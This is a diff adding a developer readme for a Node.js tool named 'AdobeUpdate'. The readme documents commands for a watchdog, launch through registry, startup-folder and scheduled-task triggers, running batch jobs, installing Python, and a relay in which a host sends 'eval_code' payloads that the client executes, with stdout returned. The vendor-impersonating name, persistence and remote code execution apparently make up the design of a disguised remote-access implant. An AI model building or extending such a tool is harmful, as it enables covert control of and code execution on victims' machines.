@@ -1,0 +1,56 @@
+
+    AdobeUpdate Readme
+    ##################
+
+    <nodejs exe fpath> <...>\adobeupdate <cmdname> <config json fpath>
+    ! no cmd line arg --> adobeupdate defaults to watchdog cmd
+
+    <nodejs exe fpath> <...>\adobeupdate launch_ping <...> --> grab cmd line args passed from startup triggers
+    --> registry, startup folders, tasks 
+
+    JobName: EXEC_BAT, run, ...
+    JobFile: bat_script.bat
+
+    <nodejs exe fpath> <...>\adobeupdate execjob <json config fpath> 
+
+    EXEC_CMD
+    Install_Python
+    StartRelay|PY|chrome
+    StartRelay|JS
+
+    <nodejs exe fpath> <...>\adobeupdate relay <json config fpath>
+                                         install_python
+
+    ? how does tpl_launch.cmd launch adobeupdate, put in cmd line args
+    ? task, reg startup, startup folder --> cmd line args passed into tpl_launch.cmd
+
+
+
+    python relay:
+    --> client to host response needs ts added 
+    --> pythonrelay.py --> iserror True when result is empty -- fix this
+
+    message sent from host to client:
+    {
+        "builtincmd": "eval_code", 
+        "payload": "print(\"test 12345\")", 
+        "MessageID": 1, 
+        "ts": "20260808211220948"
+    }
+
+    message received from client to host:
+    {
+      'payload': {
+        "result": {
+            "line": "\\nfrom datetime import datetime\\n\\nnow = datetime.now()\\n\\ncurrent_time = now.strftime(\\"%H:%M:%S\\")\\nprint(\\"Current Time:\\", current_time)\\n", 
+            "stdout": "Current Time: 10:30:44\\n", 
+            "stderr": "", 
+            "error": null
+        }
+      }, 
+      'MessageID': 2, 
+      'ts': '20260809103044023'
+    }
+
+
+
